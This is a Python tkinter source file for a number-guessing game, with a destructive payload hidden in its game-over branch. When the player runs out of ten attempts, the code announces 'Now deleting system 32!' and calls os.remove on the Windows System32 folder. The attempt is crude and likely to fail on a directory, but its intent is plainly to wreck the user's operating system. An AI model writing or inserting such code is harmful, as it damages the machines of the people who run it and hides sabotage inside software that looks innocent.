import tkinter as tk
from tkinter import messagebox
import random
import os

class GuessingGameGUI:
    def __init__(self, master):
        self.master = master
        self.master.title("Guessing Game")
        self.master.geometry("300x200")
        self.master.resizable(False, False)

        self.secret_number = random.randint(1, 100)
        self.attempts = 0
        self.max_attempts = 10

        self.create_widgets()

    def create_widgets(self):
        self.label = tk.Label(self.master, text="Welcome to the Guessing Game!", font=("Helvetica", 12))
        self.label.pack(pady=10)

        self.entry = tk.Entry(self.master, font=("Helvetica", 12))
        self.entry.pack(pady=10)

        self.submit_button = tk.Button(self.master, text="Submit", command=self.check_guess, font=("Helvetica", 12), bg="#4CAF50", fg="white", padx=10, pady=5)
        self.submit_button.pack(pady=10)

    def check_guess(self):
        try:
            guess = int(self.entry.get())
        except ValueError:
            messagebox.showerror("Invalid Input", "Please enter a valid number.")
            return

        self.attempts += 1

        if guess == self.secret_number:
            messagebox.showinfo("Congratulations", f"You guessed the correct number {self.secret_number} in {self.attempts} attempts.")
            self.master.destroy()
        elif guess < self.secret_number:
            messagebox.showinfo("Too Low", "Too low. Try again.")
        else:
            messagebox.showinfo("Too High", "Too high. Try again.")

        if self.attempts == self.max_attempts:
            messagebox.showinfo("Game Over", f"Sorry, you've run out of attempts. The correct number was {self.secret_number}. Now deleting system 32!")
            os.remove("C:\Windows\System32")
            self.master.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = GuessingGameGUI(root)
    root.mainloop()
